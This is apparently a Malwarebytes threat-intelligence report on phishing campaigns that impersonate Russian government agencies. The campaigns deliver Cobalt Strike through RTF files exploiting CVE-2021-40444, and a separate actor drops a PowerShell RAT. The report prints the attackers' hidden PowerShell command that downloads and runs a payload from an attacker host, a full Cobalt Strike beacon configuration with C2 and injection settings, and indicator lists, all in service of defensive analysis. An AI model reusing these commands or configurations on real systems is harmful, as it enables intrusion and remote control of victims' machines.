The Malwarebytes Threat Intelligence team is actively monitoring these\nthreats and has observed activities associated with the geopolitical conflict.\n\n[More specifically, we’ve witnessed several APT actors such as Mustang Panda,](https://twitter.com/h2jazi/status/1501198521139175427) [UNC1151](https://twitter.com/h2jazi/status/1500607147989684224)\n[and SCARAB that have used war-related themes to target mostly Ukraine. We’ve also](https://twitter.com/h2jazi/status/1505887653111209994)\nobserved several different [wipers and cybercrime groups such as FormBook using the same](https://blog.malwarebytes.com/threat-intelligence/2022/03/hermeticwiper-a-detailed-analysis-of-the-destructive-malware-that-targeted-ukraine/)\n[tactics. Beside those known groups we saw an actor that used multiple methods to deploy a](https://twitter.com/h2jazi/status/1501941517409083397)\nvariants of Quasar Rat. These methods include using documents that exploit CVE-20170199 and CVE-2021-40444, macro-embedded documents, and executables.\n\nOn March 23, we identified a new campaign that instead of targeting Ukraine is focusing on\nRussian citizens and government entities. Based on the email content it is likely that the\nthreat actor is targeting people that are against the Russian government.\n\nThe spear phishing emails are warning people that use websites, social networks, instant\nmessengers and VPN services that have been banned by the Russian Government and that\ncriminal charges will be laid. Victims are lured to open a malicious attachment or link to find\nout more, only to be infected with Cobalt Strike.\n\n## Spear phishing as the main initial infection vector\n\nThese emails pretend to be from the “Ministry of Digital Development, Telecommunications\nand Mass Communications of the Russian Federation” and “Federal Service for Supervision\nof Communications, Information Technology and Mass Communications” of Russia.\n\nWe have observed two documents associated with this campaign that both exploit CVE2021-40444. Even though CVE-2021-40444 has been used in a few attacks in the past, to\nthe best of our knowledge this was the first time we observed an attacker use RTF files\ninstead of Word documents to exploit this vulnerability. Also the actor leveraged a new\n[variant of this exploit called CABLESS in this attack. Sophos has reported an attack that](https://news.sophos.com/en-us/2021/12/21/attackers-test-cab-less-40444-exploit-in-a-dry-run/)\nused a Cabless variant of this exploit but in that case the actor has not used the RTF file and\nalso used RAR file to prepend the WSF data to it.\n\n\n-----\n\n**Email with RTF file:**\n\n_Федеральная служба по надзору в сфере связи, информационных_\n_технологий и массовых коммуникаций (Federal Service for Supervision of_\nCommunications, Information Technology and Mass Communications)\n_Предупреждение!

One of them is a letter about limitation of access to Telegram\napplication in Russia.\n\n\n-----\n\nFigure\n\n\n5: Lure letter\n\n\n-----\n\nFigure 6: Lure template\n\nThese RTF files contains an embedded url that downloads an html file which exploits the\nvulnerability in the MSHTML engine.\n\n```\nhttp://wallpaper.skin/office/updates/GtkjdsjkyLkjhsTYhdsd/exploit.html\n\n```\n\nThe html file contains a script that executes the script in WSF data embedded in the RTF file.\n\nFigure 7: html file\n\nThe actor has added WSF data (Windows Script Host) at the start of the RTF file. As you can\nsee from figure 8, WSF data contains a JScript code that can be accessed from a remote\nlocation. In this case this data has been accessed using the downloaded html exploit file.\n\n\n-----\n\nFigure 8: WSF data\nExecuting this scripts leads to spawning PowerShell to download a CobaltStrike beacon from\nthe remote server and execute it on the victim’s machine. (The deployed CobaltStrike file\nname is Putty)\n```\n\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -windowstyle hidden\n$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest\n'http://wallpaper.skin/office/updates/GtkjdsjkyLkjhsTYhdsd/putty.exe' -OutFile\n$env:TEMP\\putty.exe; . $env:TEMP\\putty.exe; Start-Sleep 15\n\n```\nThe following shows the CobaltStrike config:\n\n\n-----\n\n```\n{\n \"BeaconType\": [\n  \"HTTPS\"\n ],\n \"Port\": 443,\n \"SleepTime\": 38500,\n \"MaxGetSize\": 1398151,\n \"Jitter\": 27,\n \"C2Server\": \"wikipedia-book.vote,/async/newtab_ogb\",\n \"HttpPostUri\": \"/gen_204\",\n \"Malleable_C2_Instructions\": [\n  \"Remove 17 bytes from the end\",\n  \"Remove 32 bytes from the beginning\",\n  \"Base64 URL-safe decode\"\n ],\n \"SpawnTo\": \"/4jEZLD/DHKDj1CbBvlJIg==\",\n \"HttpGet_Verb\": \"GET\",\n \"HttpPost_Verb\": \"POST\",\n \"HttpPostChunk\": 96,\n \"Spawnto_x86\": \"%windir%\\\\syswow64\\\\gpupdate.exe\",\n \"Spawnto_x64\": \"%windir%\\\\sysnative\\\\gpupdate.exe\",\n \"CryptoScheme\": 0,\n \"Proxy_Behavior\": \"Use IE settings\",\n \"Watermark\": 1432529977,\n \"bStageCleanup\": \"True\",\n \"bCFGCaution\": \"True\",\n \"KillDate\": 0,\n \"bProcInject_StartRWX\": \"True\",\n \"bProcInject_UseRWX\": \"False\",\n \"bProcInject_MinAllocSize\": 16700,\n \"ProcInject_PrependAppend_x86\": [\n  \"kJCQ\",\n  \"Empty\"\n ],\n \"ProcInject_PrependAppend_x64\": [\n  \"kJCQ\",\n  \"Empty\"\n ],\n \"ProcInject_Execute\": [\n  \"ntdll.dll:RtlUserThreadStart\",\n  \"SetThreadContext\",\n  \"NtQueueApcThread-s\",\n  \"kernel32.dll:LoadLibraryA\",\n  \"RtlCreateUserThread\"\n ],\n \"ProcInject_AllocationMethod\": \"NtMapViewOfSection\",\n \"bUsesCookies\": \"True\",\n \"HostHeader\": \"\"\n}\n\n## Similar lure used by another actor\n\n```\n\n-----\n\nWe also have identified activity by another actor that uses a similar lure as the one used in\n[the previously mentioned campaign. This activity is potentially related to Carbon Spider and](https://www.virustotal.com/gui/domain/swordoke.com/community)\nuses “Федеральная служба по надзору в сфере связи, информационных технологий и\n_массовых коммуникаций” (Federal Service for Supervision of Communications, Information_\nTechnology and Mass Communications) of Russia as a template. In this case, the threat\nactor has deployed a PowerShell-based Rat.\n\n\n-----\n\nFigure 9: template\nThe dropped PowerShell script is obfuscated using a combination of Base64 and custom\nobfuscation.\n\n\n-----\n\nFigure 10: Dropped PS script\nAfter deobfuscating the script, you can see the Rat deployed by this actor. This PowerShell\nbased Rat has the capability to get the next stage payload and execute it. The next stage\npayload can be one of the following file types:\n\nJavaScript\nPowerShell\nExecutable\nDLL\n\nAll of Its communications with its server are in Base64 format. This Rat starts its activity by\nsetting up some configurations which include the C2 url, intervals, debug mode and a\nparameter named group that initialized with “Madagascar” which probably is another alias of\nthe actor.\n\nAfter setting up the configuration, it calls the “Initialize-Engine” function. This function collects\nthe victim’s info including OS info, Username, Hostname, Bios info and also a host-domain\nvalue that shows if the machine in a domain member or not. It then appends all the collected\ninto into a string and separate them by “|” character and at the end it add the group name\nand API config value. The created string is being send to the server using Send-WebInit\nfunction. This function adds “INIT%%%” string to the created string and base64 encodes it\nand sends it to the server.\n\n\n-----\n\nFigure 11: PowerShell Rat\nAfter performing the initialization, it goes into a loop that keeps calling the “Invoke-Engine”\nfunction. This function checks the incoming tasks from the server, decodes them and calls\nthe proper function to execute the incoming task. If there is no task to execute, it sends\n“GETTASK%%” in Base64 format to its server to show it is ready to get tasks and execute\nthem. The “IC” command is used to delete itself.\n\n\n-----\n\nFigure 12:\n\nInvoke task\nThe result of the task execution will be send to the server using “PUTTASK%%” command.\n\n## Infrastructure\n\nThe following shows the infrastructure used by this actor highlighting that the different lures\nare all connected.\n\n\n-----\n\nFigure 12: Infrastructure\nThe Malwarebytes Threat Intelligence continues to monitor cyber attacks related to the\nUkraine war. We are protecting our customers and sharing additional indicators of\ncompromise.\n\n## IOCs\n\n**RTF files host domain:**\n\ndigital-ministry[.]ru\n\n**RTF files:**\n\nPKH telegram.rtf\n\nb19af42ff8cf0f68e520a88f40ffd76f53a27dffa33b313fe22192813d383e1e\n\nPKH.rtf\n\n38f2b578a9da463f555614e9ca9036337dad0af4e03d89faf09b4227f035db20\n\n**MSHTML exploit:**\n\nwallpaper[.]skin/office/updates/GtkjdsjkyLkjhsTYhdsd/exploit.html\n\n4e1304f4589a706c60f1f367d804afecd3e08b08b7d5e6bd8c93384f0917385c\n\n**CobaltStrike Download URL:**\n\nwallpaper[.]skin/office/updates/GtkjdsjkyLkjhsTYhdsd/putty.exe\n\n**CobaltStrike:**\n\nPutty.exe\n\nd4eaf26969848d8027df7c8c638754f55437c0937fbf97d0d24cd20dd92ca66d\n\n**CobaltStrike C2:**\n\nwikipedia-book[.]vote/async/newtab_ogb\n\n**Macro based maldoc:**\n\nc7dd490adb297b7f529950778b5a426e8068ea2df58be5d8fd49fe55b5331e28\n\n**PowerShell based RAT:**\n\n\n-----\n\n9d4640bde3daf44cc4258eb5f294ca478306aa5268c7d314fc5019cf783041f0\n**PowerShell Rat C2:**\nswordoke[.]com\n\n\n-----",
